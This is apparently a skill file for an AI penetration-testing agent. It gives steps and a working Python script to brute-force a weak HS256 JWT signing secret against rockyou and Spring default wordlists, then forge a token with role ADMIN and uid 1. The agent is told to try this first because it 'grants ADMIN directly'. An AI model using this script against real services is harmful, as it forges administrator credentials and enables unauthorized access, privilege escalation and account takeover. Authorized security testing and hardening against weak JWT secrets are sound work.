---
name: jwt-hs256-secret-crack
description: Offline HMAC-SHA256 brute-force to crack weak JWT secrets and forge elevated-privilege (USER->ADMIN) tokens. Use when a target issues an HS256 JWT (`"alg":"HS256"` in the header) and you want to test whether the shared signing secret is weak/guessable - crack it against rockyou + Spring/Java defaults, then forge an admin token. Try before BFLA/IDOR testing: a cracked secret grants ADMIN directly. See also [[spa-authed-api-secret-disclosure]] for authed-API attack surface.
---

## When to use
Found a JWT token using HS256 cipher (`"alg":"HS256"` in header). Need to determine if the shared secret is weak/crackable, enabling token forgery for privilege escalation (USER → ADMIN).

## How
1. Decode JWT payload to inspect claims (base64 decode first 2 parts separated by `.`); note current role/uid
2. Offline HMAC-SHA256 brute-force the signature against candidate secrets:
   - Common passwords (rockyou.txt, SecLists/passwords/)
   - Service/brand names from OSINT (target domain, company, app name)
   - Spring Boot / Java defaults (secret, admin, password, 123456)
   - Hex/alphanumeric patterns (common in tutorials)
3. If computed HMAC matches the token's signature → **secret cracked** → forge new token with `"role":"ADMIN"` and higher uid
4. If no match after 250k+ candidates → secret is likely strong/random (not a vulnerability)

## Example
```python
import hmac, hashlib, base64, json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6IlVTRVIifQ.sig"
header, payload, sig = token.split(".")
payload_json = json.loads(base64.urlsafe_b64decode(payload + "=="))
print(f"Current role: {payload_json.get('role')}")

wordlist = open("wordlist.txt").read().splitlines()  # rockyou.txt + Spring defaults
for word in wordlist:
  computed_sig = base64.urlsafe_b64encode(
    hmac.new(word.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
  ).rstrip(b"=").decode()
  if computed_sig == sig:
    print(f"CRACKED: secret = {word}")
    # Forge admin token
    admin_payload = json.dumps({**payload_json, "role": "ADMIN", "uid": 1})
    admin_payload_b64 = base64.urlsafe_b64encode(admin_payload.encode()).rstrip(b"=").decode()
    admin_sig = base64.urlsafe_b64encode(
      hmac.new(word.encode(), f"{header}.{admin_payload_b64}".encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    admin_token = f"{header}.{admin_payload_b64}.{admin_sig}"
    print(f"Forged admin token: {admin_token}")
    break
```

**Why:** HS256 uses a **symmetric shared secret** for both signing and verifying. Unlike RS256 (asymmetric), a weak secret = attacker can forge any token claiming any role. This is a critical privilege-escalation vector in Spring Security + JWT configurations where HS256 is misconfigured.

**How to apply:** Attempt first before testing BFLA. If secret cracks, you skip all authorization testing—you have ADMIN directly. Also check if JWT has long expiry; short expiry (5–30 min) limits token reuse window.
